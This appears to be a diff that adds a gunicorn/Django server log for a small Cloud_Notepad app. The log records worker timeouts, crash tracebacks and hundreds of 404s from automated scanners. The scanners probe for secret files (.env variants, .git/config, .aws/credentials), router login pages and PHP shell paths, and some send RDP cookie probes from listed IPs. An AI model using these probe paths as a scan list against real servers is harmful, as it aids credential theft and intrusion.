+Not Found: /form.html
+Not Found: /webui/
+Not Found: /geoserver/web/
+Not Found: /robots.txt
+Not Found: /sitemap.xml
+Not Found: /config.json
+Not Found: /robots.txt
+[2025-05-30 16:02:54 +0800] [2926239] [WARNING] Invalid request from ip=31.7.62.234: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-30 16:59:58 +0800] [2926239] [WARNING] Invalid request from ip=193.32.162.108: Invalid HTTP request line: 'SSH-2.0-Go'
+[2025-05-30 17:10:43 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:2926239)
+[2025-05-30 17:10:43 +0800] [2926239] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 269, in parse
+    self.get_data(unreader, buf, stop=True)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-05-30 17:10:43 +0800] [2926239] [INFO] Worker exiting (pid: 2926239)
+[2025-05-30 17:10:43 +0800] [3306725] [INFO] Booting worker with pid: 3306725
+Not Found: /favicon.ico
+Not Found: /ping.js
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+[2025-05-30 21:02:56 +0800] [3306725] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-05-30 21:02:56 +0800] [3306725] [INFO] Worker exiting (pid: 3306725)
+[2025-05-30 21:02:56 +0800] [3846911] [ERROR] Worker (pid:3306725) exited with code 255
+[2025-05-30 21:02:56 +0800] [3846911] [ERROR] Worker (pid:3306725) exited with code 255.
+[2025-05-30 21:02:56 +0800] [3378169] [INFO] Booting worker with pid: 3378169
+Not Found: /favicon.ico
+Not Found: /t4
+Not Found: /1.php
+Not Found: /password.php
+Not Found: /form.html
+Not Found: /upl.php
+Not Found: /geoip/
+Not Found: /systembc/password.php
+Not Found: /login.cgi
+Not Found: /admin.cgi
+[2025-05-31 00:05:54 +0800] [3378169] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /v1/models
+[2025-05-31 03:00:47 +0800] [3378169] [WARNING] Invalid request from ip=93.123.109.71: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-31 05:43:26 +0800] [3378169] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-31 05:52:34 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:3378169)
+[2025-05-31 05:52:34 +0800] [3378169] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-05-31 05:52:34 +0800] [3378169] [INFO] Worker exiting (pid: 3378169)
+[2025-05-31 05:52:34 +0800] [3541209] [INFO] Booting worker with pid: 3541209
+Not Found: /.env
+[2025-05-31 06:27:50 +0800] [3541209] [WARNING] Invalid request from ip=31.7.62.234: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /robots.txt
+Not Found: /aaa9
+Not Found: /aab8
+Not Found: /actuator/health
+Not Found: /robots.txt
+Not Found: /t4
+Not Found: /systembc/password.php
+Not Found: /password.php
+Not Found: /form.html
+Not Found: /upl.php
+Not Found: /geoip/
+Not Found: /1.php
+Not Found: /actuator/health
+[2025-05-31 10:58:34 +0800] [3541209] [WARNING] Invalid request from ip=80.94.95.109: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-31 11:01:56 +0800] [3541209] [WARNING] Invalid request from ip=80.94.95.86: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /favicon.ico
+[2025-05-31 11:28:38 +0800] [3541209] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-05-31 11:28:38 +0800] [3541209] [INFO] Worker exiting (pid: 3541209)
+[2025-05-31 11:28:38 +0800] [3846911] [ERROR] Worker (pid:3541209) exited with code 255
+[2025-05-31 11:28:38 +0800] [3846911] [ERROR] Worker (pid:3541209) exited with code 255.
+[2025-05-31 11:28:38 +0800] [3645036] [INFO] Booting worker with pid: 3645036
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+[2025-05-31 11:44:16 +0800] [3645036] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-05-31 11:44:16 +0800] [3645036] [INFO] Worker exiting (pid: 3645036)
+[2025-05-31 11:44:16 +0800] [3846911] [ERROR] Worker (pid:3645036) exited with code 255
+[2025-05-31 11:44:16 +0800] [3846911] [ERROR] Worker (pid:3645036) exited with code 255.
+[2025-05-31 11:44:16 +0800] [3649870] [INFO] Booting worker with pid: 3649870
+Not Found: /favicon.ico
+[2025-05-31 11:55:14 +0800] [3649870] [WARNING] Invalid request from ip=80.94.95.109: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-31 11:57:20 +0800] [3649870] [WARNING] Invalid request from ip=80.94.95.86: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /t4
+[2025-05-31 12:14:01 +0800] [3649870] [WARNING] Invalid request from ip=178.159.37.112: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-05-31 12:23:18 +0800] [3649870] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /favicon.ico
+Not Found: /upl.php
+Not Found: /geoserver
+Not Found: /favicon.ico
+Not Found: /443
+Not Found: /webui/
+Not Found: /geoserver/web/
+Not Found: /geoserver/web/
+Not Found: /webui/
+Not Found: /ping.js
+Not Found: /systembc/password.php
+Not Found: /form.html
+Not Found: /t4
+Not Found: /1.php
+Not Found: /upl.php
+Not Found: /geoip/
+Not Found: /password.php
+[2025-05-31 23:27:48 +0800] [3649870] [WARNING] Invalid request from ip=93.123.109.71: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /t4
+Not Found: /hlsbkmgsplive.miguvideo.com/migu/kailu/cctv1hd265/51/20191230/index.m3u8
+Not Found: /geoip/
+Not Found: /form.html
+Not Found: /upl.php
+Not Found: /favicon.ico
+Not Found: /skin/default_1/images/logo.png
+Not Found: /favicon.ico
+Not Found: /skin/default_1/images/logo.png
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /image/lgbg.jpg
+Not Found: /image/lgbg.jpg
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+Not Found: /nobody/favicon.ico
+Not Found: /login.rsp
+Not Found: /device.rsp
+Not Found: /cgi-bin/gw.cgi
+Not Found: /cgi-bin/gw.cgi
+Not Found: /nobody/favicon.ico
+Not Found: /cgi-bin/gw.cgi
+Not Found: /login.rsp
+Not Found: /cgi-bin/gw.cgi
+Not Found: /device.rsp
+Not Found: /cgi-bin/gw.cgi
+Not Found: /cgi-bin/gw.cgi
+Not Found: /cgi-bin/gw.cgi
+Not Found: /cgi-bin/gw.cgi
+Not Found: /cgi-bin/gw.cgi
+Not Found: /cgi-bin/gw.cgi
+Not Found: /cgi-bin/gw.cgi
+Not Found: /cgi-bin/gw.cgi
+Not Found: /image/lgbg.jpg
+Not Found: /image/lgbg.jpg
+Not Found: /skin/default_1/images/logo.png
+Not Found: /.git/config
+Not Found: /.env
+Not Found: /skin/default_1/images/logo.png
+Not Found: /image/lgbg.jpg
+Not Found: /favicon.ico
+[2025-06-01 06:10:08 +0800] [3649870] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-06-01 06:10:08 +0800] [3649870] [INFO] Worker exiting (pid: 3649870)
+[2025-06-01 06:10:08 +0800] [3846911] [ERROR] Worker (pid:3649870) exited with code 255
+[2025-06-01 06:10:08 +0800] [3846911] [ERROR] Worker (pid:3649870) exited with code 255.
+[2025-06-01 06:10:08 +0800] [3990369] [INFO] Booting worker with pid: 3990369
+Not Found: /favicon.ico
+Not Found: /cgi-bin/gw.cgi
+Not Found: /skin/default_1/images/logo.png
+Not Found: /boaform/admin/formLogin
+Not Found: /ping.js
+Not Found: /.env
+Not Found: /boaform/admin/formLogin
+Not Found: /boaform/admin/formLogin
+[2025-06-01 09:57:25 +0800] [3990369] [WARNING] Invalid request from ip=80.94.95.86: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /developmentserver/metadatauploader
+Not Found: /webui/
+Not Found: /geoserver/web/
+[2025-06-01 10:34:38 +0800] [3990369] [WARNING] Invalid request from ip=80.94.95.86: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-01 10:51:39 +0800] [3990369] [WARNING] Invalid request from ip=3.132.23.201: Invalid HTTP request line: 'SSH-2.0-Go'
+Not Found: /favicon.ico
+[2025-06-01 11:46:02 +0800] [3846911] [CRITICAL] WORKER TIMEOUT (pid:3990369)
+[2025-06-01 11:46:02 +0800] [3990369] [ERROR] Error handling request (no URI read)
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 272, in parse
+    line, rbuf = self.read_line(unreader, buf, self.limit_request_line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 324, in read_line
+    self.get_data(unreader, buf)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 260, in get_data
+    data = unreader.read()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 37, in read
+    d = self.chunk()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/unreader.py", line 64, in chunk
+    return self.sock.recv(self.mxchunk)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 203, in handle_abort
+    sys.exit(1)
+SystemExit: 1
+[2025-06-01 11:46:02 +0800] [3990369] [INFO] Worker exiting (pid: 3990369)
+[2025-06-01 11:46:02 +0800] [4093777] [INFO] Booting worker with pid: 4093777
+Not Found: /developmentserver/metadatauploader
+Not Found: /aLFi
+Not Found: /SiHY
+Not Found: /aab8
+Not Found: /jquery-3.3.1.slim.min.js
+Not Found: /aab9
+Not Found: /jquery-3.3.2.slim.min.js
+Not Found: /geoip/
+Not Found: /1.php
+Not Found: /password.php
+Not Found: /form.html
+Not Found: /upl.php
+Not Found: /t4
+Not Found: /systembc/password.php
+Not Found: /robots.txt
+Not Found: /ping.js
+Not Found: /.env
+Not Found: /.env
+Not Found: /.env
+Not Found: /robots.txt
+Not Found: /sitemap.xml
+Not Found: /.env
+Not Found: /api/.env
+Not Found: /shell
+Not Found: /favicon.ico
+Not Found: /443
+Not Found: /.env.sandbox
+Not Found: /.env.config
+Not Found: /.env.dev
+Not Found: /files/.git/config
+Not Found: /server/.git/config
+Not Found: /.env.prod
+Not Found: /.env.template
+Not Found: /public/.git/config
+Not Found: /src/.git/config
+Not Found: /.env.ci
+Not Found: /.git/config
+Not Found: /config/.env
+Not Found: /app/.git/config
+Not Found: /www/.git/config
+Not Found: /.env.local
+Not Found: /.env.stage
+Not Found: /build/.env
+Not Found: /.env.test
+Not Found: /.env.testing
+Not Found: /config.json
+Not Found: /.env.dist
+Not Found: /data/.git/config
+Not Found: /static../.git/config
+Not Found: /.env.production.local
+Not Found: /project/.git/config
+Not Found: /api/.git/config
+Not Found: /dev/.git/config
+Not Found: /docker-compose.prod.yml
+Not Found: /.env.default
+Not Found: /.env.development.local
+Not Found: /settings/.env
+Not Found: /media../.git/config
+Not Found: /.aws/credentials
+Not Found: /.env.backup
+Not Found: /.env.preprod
+Not Found: /.env.secret
+Not Found: /configuration/.env
+Not Found: /.env.dev.local
+Not Found: /config/.git/config
+Not Found: /.env.live
+Not Found: /assets../.git/config
+Not Found: /prod/.env
+Not Found: /.env.production
+Not Found: /.env.staging.local
+Not Found: /.env
+Not Found: /.env.save
+Not Found: /cms/.git/config
+Not Found: /api/.env
+Not Found: /.env.bak
+Not Found: /core/.git/config
+Not Found: /.env_sample
+Not Found: /.env.uat
+Not Found: /backup/.git/config
+Not Found: /portal/redlion
+Not Found: /favicon.ico
+Not Found: /boaform/admin/formLogin
+Not Found: /favicon.ico
+[2025-06-02 06:04:42 +0800] [4093777] [ERROR] Exception in worker process
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 134, in handle
+    req = next(parser)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/parser.py", line 42, in __next__
+    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 257, in __init__
+    super().__init__(cfg, unreader, peer_addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 60, in __init__
+    unused = self.parse(self.unreader)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 281, in parse
+    self.parse_request_line(line)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
+    raise InvalidHTTPVersion(self.version)
+gunicorn.http.errors.InvalidHTTPVersion: <unprintable InvalidHTTPVersion object>
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
+    worker.init_process()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 142, in init_process
+    self.run()
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 126, in run
+    self.run_for_one(timeout)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
+    self.accept(listener)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 32, in accept
+    self.handle(listener, client, addr)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/sync.py", line 158, in handle
+    self.handle_error(req, client, addr, e)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/workers/base.py", line 225, in handle_error
+    mesg = "Invalid HTTP Version '%s'" % str(exc)
+  File "/home/ubuntu/Cloud_Notepad/venv/lib/python3.10/site-packages/gunicorn/http/errors.py", line 56, in __str__
+    return "Invalid HTTP Version: %r" % self.version
+TypeError: not all arguments converted during string formatting
+[2025-06-02 06:04:42 +0800] [4093777] [INFO] Worker exiting (pid: 4093777)
+[2025-06-02 06:04:42 +0800] [3846911] [ERROR] Worker (pid:4093777) exited with code 255
+[2025-06-02 06:04:42 +0800] [3846911] [ERROR] Worker (pid:4093777) exited with code 255.
+[2025-06-02 06:04:42 +0800] [238475] [INFO] Booting worker with pid: 238475
+Not Found: /favicon.ico
+Not Found: /5elV
+Not Found: /BocI
+Not Found: /aab8
+Not Found: /jquery-3.3.1.slim.min.js
+Not Found: /aab9
+Not Found: /jquery-3.3.2.slim.min.js
+[2025-06-02 10:25:11 +0800] [238475] [WARNING] Invalid request from ip=80.94.95.86: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+[2025-06-02 10:37:25 +0800] [238475] [WARNING] Invalid request from ip=80.94.95.64: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /aaa9
+Not Found: /aab9
+[2025-06-02 11:11:28 +0800] [238475] [WARNING] Invalid request from ip=79.124.49.202: Invalid HTTP request line: '\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr'
+Not Found: /aaa9
+Not Found: /aab8
+Not Found: /aaa9
+Not Found: /aab9
+Not Found: /ping.js
